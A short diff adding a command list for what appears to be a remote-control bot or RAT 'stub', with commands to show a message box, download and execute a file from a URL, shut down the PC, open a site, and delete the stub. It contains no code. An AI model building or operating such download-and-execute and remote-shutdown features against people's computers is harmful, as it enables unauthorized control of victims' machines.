@@ -1,0 +1,6 @@
+Command list:
+.[msg-box]|title|message - Shows a Message box
+.[d&e]|URL - Downloads and executes a file
+.[shutdown] - Shutdown's the PC'
+.[visit] - Opens a site
+.[uninstall] - Closes and deletes the stub
